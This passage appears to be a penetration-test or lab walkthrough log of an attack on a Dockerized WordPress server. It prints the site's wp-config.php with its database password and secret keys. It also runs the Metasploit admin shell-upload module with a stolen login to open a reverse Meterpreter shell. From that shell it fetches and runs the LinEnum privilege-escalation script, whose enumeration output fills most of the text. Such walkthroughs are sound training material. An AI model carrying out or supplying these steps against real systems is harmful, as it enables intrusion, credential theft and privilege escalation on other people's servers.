+-rw-r--r--  1 www-data www-data  3301 Oct 25  2016 wp-load.php
+-rw-r--r--  1 www-data www-data 34347 Mar 16 23:03 wp-login.php
+-rw-r--r--  1 www-data www-data  8048 Jan 11  2017 wp-mail.php
+-rw-r--r--  1 www-data www-data 16200 Apr  6  2017 wp-settings.php
+-rw-r--r--  1 www-data www-data 29924 Jan 24  2017 wp-signup.php
+-rw-r--r--  1 www-data www-data  4513 Oct 14  2016 wp-trackback.php
+-rw-r--r--  1 www-data www-data  3065 Aug 31  2016 xmlrpc.php
+
+$ hostname
+8f4bca8ef241
+
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+
+=======================================================================================================
+Step 3. Post-Exploitation and Privilege escalation to become Root
+=======================================================================================================
+
+
+$ cat /var/www/html/wp-config.php
+<?php
+/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the
+ * installation. You don't have to use the web site, you can
+ * copy this file to "wp-config.php" and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * MySQL settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://codex.wordpress.org/Editing_wp-config.php
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define('DB_NAME', 'wordpress');
+
+/** MySQL database username */
+define('DB_USER', 'wordpress');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'WordPressISBest');
+
+/** MySQL hostname */
+define('DB_HOST', 'db:3306');
+
+/** Database Charset to use in creating database tables. */
+define('DB_CHARSET', 'utf8');
+
+/** The Database Collate type. Don't change this if in doubt. */
+define('DB_COLLATE', '');
+
+/**#@+
+ * Authentication Unique Keys and Salts.
+ *
+ * Change these to different unique phrases!
+ * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
+ * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+define('AUTH_KEY',         '853e970525ab9be27353b4e47e1c7ae74bad6edd');
+define('SECURE_AUTH_KEY',  'db109c684d50566b803837fda86203730fb36cea');
+define('LOGGED_IN_KEY',    '8a0301ce6a8b14a1e15439c1e9cf9c791e5e9157');
+define('NONCE_KEY',        'ff187d8251216e06badd61b867c83651c6214ec4');
+define('AUTH_SALT',        'd2ca4470f040f6fc2e7336b2c1ea78eacfd6b305');
+define('SECURE_AUTH_SALT', 'e35d8bd5577557d947c6e98c510107207d52941e');
+define('LOGGED_IN_SALT',   '733de3cb7cec9d21c9d77844bacadc1a098a15b4');
+define('NONCE_SALT',       'f6af597be5e1f770dfaf3a68f91898b9aada2774');
+
+/**#@-*/
+
+/**
+ * WordPress Database Table prefix.
+ *
+ * You can have multiple installations in one database if you give each
+ * a unique prefix. Only numbers, letters, and underscores please!
+ */
+$table_prefix  = 'wp_';
+
+/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ *
+ * For information on other constants that can be used for debugging,
+ * visit the Codex.
+ *
+ * @link https://codex.wordpress.org/Debugging_in_WordPress
+ */
+define('WP_DEBUG', false);
+
+// If we're behind a proxy server and using HTTPS, we need to alert Wordpress of that fact
+// see also http://codex.wordpress.org/Administration_Over_SSL#Using_a_Reverse_Proxy
+if (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') {
+    $_SERVER['HTTPS'] = 'on';
+}
+
+/* That's all, stop editing! Happy blogging. */
+
+/** Absolute path to the WordPress directory. */
+if ( !defined('ABSPATH') )
+    define('ABSPATH', dirname(__FILE__) . '/');
+
+define( 'WP_SITEURL', 'http://' . $_SERVER['HTTP_HOST'] );
+define( 'WP_HOME', 'http://' . $_SERVER['HTTP_HOST'] );
+/** Sets up WordPress vars and included files. */
+require_once(ABSPATH . 'wp-settings.php');
+
+
+
+$ ip address show 
+1: lo: <LOOPBACK,UP,LOWER_UP> Mt 65536 qdisc noqueue state UNKNOWN group default 
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+9: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:ac:12:00:04 brd ff:ff:ff:ff:ff:ff
+    inet 172.18.0.4/16 scope global eth0
+       valid_lft forever preferred_lft forever
+
+
+$ ps -ealwf
+F S UID        PID  PPID  C PRI  NI ADDR SZ WCHAN  STIME TTY          TIME CMD
+4 S root         1     0  0  80   0 - 78767 -      Mar16 ?        00:00:00 apache2 -DFOREGROUND
+5 S www-data    91     1  0  80   0 - 99139 -      Mar16 ?        00:00:21 apache2 -DFOREGROUND
+5 S www-data    94     1  0  80   0 - 99216 -      Mar16 ?        00:00:25 apache2 -DFOREGROUND
+5 S www-data   109     1  0  80   0 - 80314 -      Mar16 ?        00:00:26 apache2 -DFOREGROUND
+5 S www-data   110     1  0  80   0 - 99197 -      Mar16 ?        00:00:30 apache2 -DFOREGROUND
+5 S www-data   113     1  0  80   0 - 99202 -      Mar16 ?        00:00:24 apache2 -DFOREGROUND
+5 S www-data   119     1  0  80   0 - 99295 -      Mar16 ?        00:00:31 apache2 -DFOREGROUND
+5 S www-data   120     1  0  80   0 - 99128 -      Mar16 ?        00:00:26 apache2 -DFOREGROUND
+5 S www-data   121     1  0  80   0 - 80177 -      Mar16 ?        00:00:24 apache2 -DFOREGROUND
+5 S www-data   129     1  0  80   0 - 99154 -      Mar16 ?        00:00:26 apache2 -DFOREGROUND
+5 S www-data   138     1  0  80   0 - 99354 -      Mar16 ?        00:00:00 apache2 -DFOREGROUND
+0 S www-data   147   138  0  80   0 -  1082 -      Mar16 ?        00:00:00 sh -c /bin/sh 
+0 S www-data   148   147  0  80   0 -  1082 -      Mar16 ?        00:00:00 /bin/sh
+0 S www-data  3600   110  0  80   0 -  1082 -      00:25 ?        00:00:00 sh -c exec 2>&1; ps -ealwf
+0 R www-data  3601  3600  0  80   0 -  4373 -      00:25 ?        00:00:00 ps -ealwf
+
+
+$ find / -name docker*
+/etc/apache2/conf-available/docker-php.conf
+/etc/apache2/conf-enabled/docker-php.conf
+/etc/dpkg/dpkg.cfg.d/docker-apt-speedup
+/etc/apt/apt.conf.d/docker-clean
+/etc/apt/apt.conf.d/docker-autoremove-suggests
+/etc/apt/apt.conf.d/docker-gzip-indexes
+/etc/apt/apt.conf.d/docker-no-languages
+/usr/local/bin/docker-entrypoint.sh
+/usr/local/bin/docker-php-ext-enable
+/usr/local/bin/docker-php-entrypoint
+/usr/local/bin/docker-php-ext-install
+/usr/local/bin/docker-php-ext-configure
+/usr/local/bin/docker-php-source
+/usr/local/etc/php/conf.d/docker-php-ext-opcache.ini
+/usr/local/etc/php/conf.d/docker-php-ext-mysqli.ini
+/usr/local/etc/php/conf.d/docker-php-ext-gd.ini
+/var/lib/apache2/conf/enabled_by_admin/docker-php
+
+
+Check if we have access to '/var/run/docker.sock' 
+-------------------------------------------------
+$ ls -al /var/run/docker.sock
+ls: cannot access /var/run/docker.sock: No such file or directory
+
+
+Use the Metasploit framework to get a reverse shell + LinEnum script
+=======================================================================
+
+msf5 > use exploit/unix/webapp/wp_admin_shell_upload
+msf5 exploit(unix/webapp/wp_admin_shell_upload) > options
+
+Module options (exploit/unix/webapp/wp_admin_shell_upload):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD   Welcome1         yes       The WordPress password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     192.168.1.39     yes       The target address range or CIDR identifier
+   RPORT      8000             yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       The base path to the wordpress application
+   USERNAME   bob              yes       The WordPress username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   WordPress
+
+
+msf5 exploit(unix/webapp/wp_admin_shell_upload) > run
+
+[*] Started reverse TCP handler on 192.168.1.8:4444 
+[*] Authenticating with WordPress using bob:Welcome1...
+[+] Authenticated with WordPress
+[*] Preparing payload...
+[*] Uploading payload...
+[*] Executing the payload at /wp-content/plugins/NwbkEBdyAM/RDnSgXzJDh.php...
+[*] Sending stage (38247 bytes) to 192.168.1.39
+[*] Meterpreter session 1 opened (192.168.1.8:4444 -> 192.168.1.39:35008) at 2020-03-17 00:52:21 +0100
+[+] Deleted RDnSgXzJDh.php
+[+] Deleted NwbkEBdyAM.php
+[+] Deleted ../NwbkEBdyAM
+
+meterpreter > 
+meterpreter > getuid
+Server username: www-data (33)
+meterpreter > pwd
+
+meterpreter > shell
+Process 147 created.
+Channel 0 created.
+sh: 0: getcwd() failed: No such file or directory
+sh: 0: getcwd() failed: No such file or directory
+
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+pwd
+
+hostname
+8f4bca8ef241
+
+cat /etc/group
+root:x:0:
+daemon:x:1:
+bin:x:2:
+sys:x:3:
+adm:x:4:
+tty:x:5:
+disk:x:6:
+lp:x:7:
+mail:x:8:
+news:x:9:
+uucp:x:10:
+man:x:12:
+proxy:x:13:
+kmem:x:15:
+dialout:x:20:
+fax:x:21:
+voice:x:22:
+cdrom:x:24:
+floppy:x:25:
+tape:x:26:
+sudo:x:27:
+audio:x:29:
+dip:x:30:
+www-data:x:33:
+backup:x:34:
+operator:x:37:
+list:x:38:
+irc:x:39:
+src:x:40:
+gnats:x:41:
+shadow:x:42:
+utmp:x:43:
+video:x:44:
+sasl:x:45:
+plugdev:x:46:
+staff:x:50:
+games:x:60:
+users:x:100:
+nogroup:x:65534:
+input:x:101:
+systemd-journal:x:102:
+systemd-timesync:x:103:
+systemd-network:x:104:
+systemd-resolve:x:105:
+systemd-bus-proxy:x:106:
+
+ls -al
+total 0
+
+cd /
+
+ls -al
+total 72
+drwxr-xr-x  71 root root 4096 Aug 22  2017 .
+drwxr-xr-x  71 root root 4096 Aug 22  2017 ..
+-rwxr-xr-x   1 root root    0 Aug 22  2017 .dockerenv
+drwxr-xr-x   2 root root 4096 Jul 24  2017 bin
+drwxr-xr-x   2 root root 4096 Jul 13  2017 boot
+drwxr-xr-x   5 root root  340 Mar 16 22:31 dev
+drwxr-xr-x  70 root root 4096 Aug 22  2017 etc
+drwxr-xr-x   2 root root 4096 Jul 13  2017 home
+drwxr-xr-x  13 root root 4096 Aug  4  2017 lib
+drwxr-xr-x   2 root root 4096 Jul 23  2017 lib64
+drwxr-xr-x   2 root root 4096 Jul 23  2017 media
+drwxr-xr-x   2 root root 4096 Jul 23  2017 mnt
+drwxr-xr-x   2 root root 4096 Jul 23  2017 opt
+dr-xr-xr-x 102 root root    0 Mar 16 22:31 proc
+drwx------   2 root root 4096 Aug  3  2017 root
+drwxr-xr-x   7 root root 4096 Aug 22  2017 run
+drwxr-xr-x   2 root root 4096 Jul 23  2017 sbin
+drwxr-xr-x   2 root root 4096 Jul 23  2017 srv
+dr-xr-xr-x  13 root root    0 Mar 16 22:31 sys
+drwxrwxrwt   2 root root 4096 Mar 16 23:52 tmp
+drwxr-xr-x  44 root root 4096 Aug  4  2017 usr
+drwxr-xr-x  33 root root 4096 Aug  4  2017 var
+
+
+cd /tmp/
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O LinEnums.sh
+/bin/sh: 15: wget: not found
+curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh > LinEnums.sh
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 46631  100 46631    0     0   309k      0 --:--:-- --:--:-- --:--:--  309k
+ls
+LinEnums.sh
+
+mv LinEnums.sh LinEnum.sh
+
+chmod +x LinEnum.sh
+
+./LinEnum.sh -t
+
+#########################################################
+# Local Linux Enumeration & Privilege Escalation Script #
+#########################################################
+# www.rebootuser.com
+# version 0.982
+
+[-] Debug Info
+[+] Thorough tests = Enabled
+
+
+Scan started at:
+Tue Mar 17 00:07:01 UTC 2020
+
+
+### SYSTEM ##############################################
+[-] Kernel information:
+Linux 8f4bca8ef241 3.13.0-128-generic #177-Ubuntu SMP Tue Aug 8 11:40:23 UTC 2017 x86_64 GNU/Linux
+
+
+[-] Kernel information (continued):
+Linux version 3.13.0-128-generic (buildd@lgw01-39) (gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3) ) #177-Ubuntu SMP Tue Aug 8 11:40:23 UTC 2017
+
+
+[-] Specific release information:
+PRETTY_NAME="Debian GNU/Linux 8 (jessie)"
+NAME="Debian GNU/Linux"
+VERSION_ID="8"
+VERSION="8 (jessie)"
+ID=debian
+HOME_URL="http://www.debian.org/"
+SUPPORT_URL="http://www.debian.org/support"
+BUG_REPORT_URL="https://bugs.debian.org/"
+
+
+[-] Hostname:
+8f4bca8ef241
+
+
+### USER/GROUP ##########################################
+[-] Current user/group info:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+[-] Users that have previously logged onto the system:
+Username         Port     From             Latest
+
+
+[-] Who else is logged on:
+ 00:07:01 up  1:35,  0 users,  load average: 0.00, 0.01, 0.67
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+
+
+[-] Group memberships:
+uid=0(root) gid=0(root) groups=0(root)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+uid=2(bin) gid=2(bin) groups=2(bin)
+uid=3(sys) gid=3(sys) groups=3(sys)
+uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
+uid=5(games) gid=60(games) groups=60(games)
+uid=6(man) gid=12(man) groups=12(man)
+uid=7(lp) gid=7(lp) groups=7(lp)
+uid=8(mail) gid=8(mail) groups=8(mail)
+uid=9(news) gid=9(news) groups=9(news)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=13(proxy) gid=13(proxy) groups=13(proxy)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=34(backup) gid=34(backup) groups=34(backup)
+uid=38(list) gid=38(list) groups=38(list)
+uid=39(irc) gid=39(irc) groups=39(irc)
+uid=41(gnats) gid=41(gnats) groups=41(gnats)
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+uid=100(systemd-timesync) gid=103(systemd-timesync) groups=103(systemd-timesync)
+uid=101(systemd-network) gid=104(systemd-network) groups=104(systemd-network)
+uid=102(systemd-resolve) gid=105(systemd-resolve) groups=105(systemd-resolve)
+uid=103(systemd-bus-proxy) gid=106(systemd-bus-proxy) groups=106(systemd-bus-proxy)
+
+
+[-] Contents of /etc/passwd:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
+
+
+[-] Super user account(s):
+root
+
+
+./LinEnum.sh: line 219: echo: write error: Broken pipe
+./LinEnum.sh: line 252: echo: write error: Broken pipe
+[-] Are permissions on /home directories lax:
+total 8.0K
+drwxr-xr-x  2 root root 4.0K Jul 13  2017 .
+drwxr-xr-x 71 root root 4.0K Aug 22  2017 ..
+
+
+[-] Files owned by our user:
+-rwxr-xr-x 1 www-data www-data 46631 Mar 17 00:05 /tmp/LinEnum.sh
+-rw-r--r-- 1 www-data www-data 4513 Oct 14  2016 /usr/src/wordpress/wp-trackback.php
+-rw-r--r-- 1 www-data www-data 2255 May 22  2013 /usr/src/wordpress/wp-content/plugins/hello.php
+
+<SNIP>
+
+-rw-r--r-- 1 www-data www-data 17987 Jul 29  2011 /usr/src/wordpress/wp-includes/js/plupload/license.txt
+-rw-r--r-- 1 www-data www-data 113081 Oct 10  2015 /usr/src/wordpress/wp-includes/js/plupload/plupload.full.min.js
+-rw-r--r-- 1 www-data www-data 63118 Oct 10  2015 /usr/src/wordpress/wp-includes/js/plupload/plupload.silverlight.xap
+-rw-r--r-- 1 www-data www-data 29570 May  6  2016 /usr/src/wordpress/wp-includes/js/plupload/plupload.flash.swf
+-rw-r--r-- 1 www-data www-data 10551 May 16  2017 /usr/src/wordpress/wp-includes/js/plupload/handlers.min.js
+-rw-r--r-- 1 www-data www-data 12714 Jun 16  2016 /usr/src/wordpress/wp-includes/js/plupload/wp-plupload.js
+-rw-r--r-- 1 www-data www-data 22815 May 19  2017 /usr/src/wordpress/wp-includes/class-wp-customize-control.php
+-rw-r--r-- 1 www-data www-data 7680 Apr 19  2017 /usr/src/wordpress/wp-includes/class-wp-site.php
+-rw-r--r-- 1 www-data www-data 12085 Aug 26  2016 /usr/src/wordpress/wp-includes/class-wp-embed.php
+-rw-r--r-- 1 www-data www-data 2708 Aug 25  2016 /usr/src/wordpress/wp-includes/class-wp-feed-cache-transient.php
+
+<SNIP>
+
+-rw-r--r-- 1 www-data www-data 29924 Jan 24  2017 /var/www/html/wp-signup.php
+-rw-r--r-- 1 www-data www-data 2422 Nov 21  2016 /var/www/html/wp-links-opml.php
+-rw-r--r-- 1 www-data www-data 16200 Apr  6  2017 /var/www/html/wp-settings.php
+-rw-r--r-- 1 www-data www-data 2764 Mar 16 22:31 /var/www/html/wp-config-sample.php
+-rw-r--r-- 1 www-data www-data 418 Sep 25  2013 /var/www/html/index.php
+-rw-r--r-- 1 www-data www-data 7413 Mar 16 23:03 /var/www/html/readme.html
+-rw-r--r-- 1 www-data www-data 8048 Jan 11  2017 /var/www/html/wp-mail.php
+-rw-r--r-- 1 www-data www-data 364 Dec 19  2015 /var/www/html/wp-blog-header.php
+-rw-r--r-- 1 www-data www-data 6864 Mar 16 23:03 /var/www/html/wp-activate.php
+-rw-r--r-- 1 www-data www-data 235 Aug 19  2017 /var/www/html/.htaccess
+
+
+[-] Hidden files:
+-rwxr-xr-x 1 root root 0 Aug 22  2017 /.dockerenv
+-rw-r--r-- 1 root root 187 Jul 24  2017 /etc/init.d/.depend.start
+-rw-r--r-- 1 root root 946 Jul 24  2017 /etc/init.d/.depend.boot
+-rw-r--r-- 1 root root 247 Jul 24  2017 /etc/init.d/.depend.stop
+-rw------- 1 root root 0 Jul 23  2017 /etc/.pwd.lock
+-rw-r--r-- 1 root root 3515 Nov  5  2016 /etc/skel/.bashrc
+-rw-r--r-- 1 root root 220 Nov  5  2016 /etc/skel/.bash_logout
+-rw-r--r-- 1 root root 675 Nov  5  2016 /etc/skel/.profile
+-rw-r--r-- 1 root staff 0 Aug  3  2017 /usr/local/lib/php/.depdblock
+-rw-r--r-- 1 root staff 0 Aug  3  2017 /usr/local/lib/php/.lock
+-rw-r--r-- 1 root staff 6961 Aug  3  2017 /usr/local/lib/php/.filemap
+-rw-r--r-- 1 root staff 2470 Aug  3  2017 /usr/local/lib/php/.depdb
+-rw-r--r-- 1 www-data www-data 629 May  9  2016 /usr/src/wordpress/wp-content/plugins/akismet/.htaccess
+-rw-r--r-- 1 www-data www-data 629 Aug 19  2017 /var/www/html/wp-content/plugins/akismet/.htaccess
+-rw-r--r-- 1 www-data www-data 235 Aug 19  2017 /var/www/html/.htaccess
+
+
+[-] Home directory contents:
+total 12K
+drwxr-xr-x  4 root     root     4.0K Jul 24  2017 .
+drwxr-xr-x 33 root     root     4.0K Aug  4  2017 ..
+drwxr-xr-x  5 www-data www-data 4.0K Mar 16 23:03 html
+
+
+### ENVIRONMENTAL #######################################
+[-] Environment information:
+APACHE_PID_FILE=/var/run/apache2/apache2.pid
+HOSTNAME=8f4bca8ef241
+APACHE_RUN_USER=www-data
+PHP_INI_DIR=/usr/local/etc/php
+PHP_ASC_URL=https://secure.php.net/get/php-5.6.31.tar.xz.asc/from/this/mirror
+PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2
+PHP_MD5=
+PHPIZE_DEPS=autoconf 		dpkg-dev 		file 		g++ 		gcc 		libc-dev 		libpcre3-dev 		make 		pkg-config 		re2c
+PHP_URL=https://secure.php.net/get/php-5.6.31.tar.xz/from/this/mirror
+APACHE_ENVVARS=/etc/apache2/envvars
+WORDPRESS_VERSION=4.8.1
+PHP_LDFLAGS=-Wl,-O1 -Wl,--hash-style=both -pie
+APACHE_LOG_DIR=/var/log/apache2
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2
+GPG_KEYS=0BD78B5F97500D450838F95DFE857D9A90D90EC1 6E4F6AB321FDC07F2C332E3AC2BF0BC433CFC8B3
+PWD=/tmp
+APACHE_RUN_GROUP=www-data
+LANG=C
+SHLVL=1
+PHP_SHA256=c464af61240a9b7729fabe0314cdbdd5a000a4f0c9bd201f89f8628732fe4ae4
+WORDPRESS_SHA1=5376cf41403ae26d51ca55c32666ef68b10e35a4
+APACHE_CONFDIR=/etc/apache2
+affinity:container==d7927efe25477e1c012ff12b8427f0142a7baafb399ef5095819881a05030820
+PHP_EXTRA_BUILD_DEPS=apache2-dev
+APACHE_LOCK_DIR=/var/lock/apache2
+APACHE_RUN_DIR=/var/run/apache2
+PHP_VERSION=5.6.31
+PHP_EXTRA_CONFIGURE_ARGS=--with-apxs2
+_=/usr/bin/env
+
+
+[-] Path information:
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+drwxr-xr-x 2 root root  4096 Jul 24  2017 /bin
+drwxr-xr-x 2 root root  4096 Jul 23  2017 /sbin
+drwxr-xr-x 2 root root  4096 Aug  4  2017 /usr/bin
+drwxrwsr-x 2 root staff 4096 Aug  4  2017 /usr/local/bin
+drwxrwsr-x 2 root staff 4096 Jul 23  2017 /usr/local/sbin
+drwxr-xr-x 2 root root  4096 Aug  3  2017 /usr/sbin
+
+
+[-] Available shells:
+# /etc/shells: valid login shells
+/bin/sh
+/bin/dash
+/bin/bash
+/bin/rbash
+
+
+[-] Current umask value:
+0022
+u=rwx,g=rx,o=rx
+
+
+[-] umask value as specified in /etc/login.defs:
+UMASK		022
+
+
+[-] Password and storage information:
+PASS_MAX_DAYS	99999
+PASS_MIN_DAYS	0
+PASS_WARN_AGE	7
+ENCRYPT_METHOD SHA512
+
+
+### JOBS/TASKS ##########################################
+[-] Cron jobs:
+total 36
+drwxr-xr-x  2 root root  4096 Aug  3  2017 .
+drwxr-xr-x 70 root root  4096 Aug 22  2017 ..
+-rwxr-xr-x  1 root root   625 Jul 18  2017 apache2
+-rwxr-xr-x  1 root root 15000 Dec 11  2016 apt
+-rwxr-xr-x  1 root root  1597 May  2  2016 dpkg
+-rwxr-xr-x  1 root root   249 May 17  2017 passwd
+
+
+### NETWORKING  ##########################################
+[-] Network and IP info:
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default 
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+9: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:ac:12:00:04 brd ff:ff:ff:ff:ff:ff
+    inet 172.18.0.4/16 scope global eth0
+       valid_lft forever preferred_lft forever
+
+
+[-] ARP history:
+172.18.0.3 dev eth0 lladdr 02:42:ac:12:00:03 STALE
+172.18.0.1 dev eth0 lladdr 02:42:c2:59:ae:f5 REACHABLE
+
+
+[-] Nameserver(s):
+nameserver 127.0.0.11
+
+
+[-] Default route:
+default via 172.18.0.1 dev eth0 
+
+
+[-] Listening TCP:
+State      Recv-Q Send-Q        Local Address:Port          Peer Address:Port 
+LISTEN     0      128              127.0.0.11:51362                    *:*     
+LISTEN     0      128                       *:80                       *:*     
+
+
+[-] Listening UDP:
+State      Recv-Q Send-Q        Local Address:Port          Peer Address:Port 
+UNCONN     0      0                127.0.0.11:60603                    *:*     
+
+
+### SERVICES #############################################
+[-] Running processes:
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  2.3 315068 23412 ?        Ss   Mar16   0:00 apache2 -DFOREGROUND
+www-data    91  0.6  2.8 321264 28596 ?        S    Mar16   0:21 apache2 -DFOREGROUND
+www-data    94  0.7  3.4 396864 35464 ?        S    Mar16   0:25 apache2 -DFOREGROUND
+www-data   109  0.7  2.5 321256 26424 ?        S    Mar16   0:26 apache2 -DFOREGROUND
+www-data   110  0.8  3.3 396788 34304 ?        S    Mar16   0:30 apache2 -DFOREGROUND
+www-data   113  0.7  3.4 396808 34792 ?        S    Mar16   0:24 apache2 -DFOREGROUND
+www-data   119  0.8  3.6 397180 36668 ?        S    Mar16   0:31 apache2 -DFOREGROUND
+www-data   120  0.7  3.3 396512 34296 ?        S    Mar16   0:26 apache2 -DFOREGROUND
+www-data   121  0.7  2.9 320708 30348 ?        S    Mar16   0:24 apache2 -DFOREGROUND
+www-data   129  0.7  3.5 396616 35952 ?        S    Mar16   0:26 apache2 -DFOREGROUND
+www-data   138  0.0  3.3 397416 34072 ?        S    Mar16   0:00 apache2 -DFOREGROUND
+www-data   147  0.0  0.0   4328   656 ?        S    Mar16   0:00 sh -c /bin/sh 
+www-data   148  0.0  0.0   4328   696 ?        S    Mar16   0:00 /bin/sh
+www-data   163  0.0  0.2  21040  2540 ?        S    00:06   0:00 /bin/bash ./LinEnum.sh -t
+www-data   164  0.5  0.3  23612  3732 ?        S    00:06   0:00 /bin/bash ./LinEnum.sh -t
+www-data   165  0.0  0.0   4228   356 ?        S    00:06   0:00 tee -a
+www-data  3349  0.0  0.3  23612  3432 ?        S    00:07   0:00 /bin/bash ./LinEnum.sh -t
+www-data  3350  0.0  0.1  17492  1156 ?        R    00:07   0:00 ps aux
+
+
+[-] Process binaries and associated permissions (from above list):
+-rwxr-xr-x 1 root root 1029624 Nov  5  2016 /bin/bash
+lrwxrwxrwx 1 root root       4 Nov  8  2014 /bin/sh -> dash
+
+
+[-] /etc/init.d/ binary permissions:
+total 176
+drwxr-xr-x  2 root root  4096 Jul 24  2017 .
+drwxr-xr-x 70 root root  4096 Aug 22  2017 ..
+-rw-r--r--  1 root root   946 Jul 24  2017 .depend.boot
+-rw-r--r--  1 root root   187 Jul 24  2017 .depend.start
+-rw-r--r--  1 root root   247 Jul 24  2017 .depend.stop
+-rw-r--r--  1 root root  2427 Apr  6  2015 README
+-rwxr-xr-x  1 root root 10184 Jul 18  2017 apache2
+-rwxr-xr-x  1 root root  1276 Apr  6  2015 bootlogs
+-rwxr-xr-x  1 root root  1248 Apr  6  2015 bootmisc.sh
+-rwxr-xr-x  1 root root  3807 Apr  6  2015 checkfs.sh
+-rwxr-xr-x  1 root root  1072 Apr  6  2015 checkroot-bootclean.sh
+-rwxr-xr-x  1 root root  9290 Apr  6  2015 checkroot.sh
+-rwxr-xr-x  1 root root  1336 Apr  6  2015 halt
+-rwxr-xr-x  1 root root  1423 Apr  6  2015 hostname.sh
+-rwxr-xr-x  1 root root  3916 Mar 29  2015 hwclock.sh
+-rwxr-xr-x  1 root root  1300 Apr  6  2015 killprocs
+-rwxr-xr-x  1 root root   995 Apr  6  2015 motd
+-rwxr-xr-x  1 root root   677 Apr  6  2015 mountall-bootclean.sh
+-rwxr-xr-x  1 root root  2138 Apr  6  2015 mountall.sh
+-rwxr-xr-x  1 root root  1461 Apr  6  2015 mountdevsubfs.sh
+-rwxr-xr-x  1 root root  1564 Apr  6  2015 mountkernfs.sh
+-rwxr-xr-x  1 root root   685 Apr  6  2015 mountnfs-bootclean.sh
+-rwxr-xr-x  1 root root  2456 Apr  6  2015 mountnfs.sh
+-rwxr-xr-x  1 root root  1192 Mar  6  2015 procps
+-rwxr-xr-x  1 root root  6228 Apr  6  2015 rc
+-rwxr-xr-x  1 root root   820 Apr  6  2015 rc.local
+-rwxr-xr-x  1 root root   117 Apr  6  2015 rcS
+-rwxr-xr-x  1 root root   661 Apr  6  2015 reboot
+-rwxr-xr-x  1 root root  1042 Apr  6  2015 rmnologin
+-rwxr-xr-x  1 root root  3207 Apr  6  2015 sendsigs
+-rwxr-xr-x  1 root root   597 Apr  6  2015 single
+-rw-r--r--  1 root root  1087 Apr  6  2015 skeleton
+-rwxr-xr-x  1 root root  6581 Mar 10  2017 udev
+-rwxr-xr-x  1 root root   461 Mar 10  2017 udev-finish
+-rwxr-xr-x  1 root root  2737 Apr  6  2015 umountfs
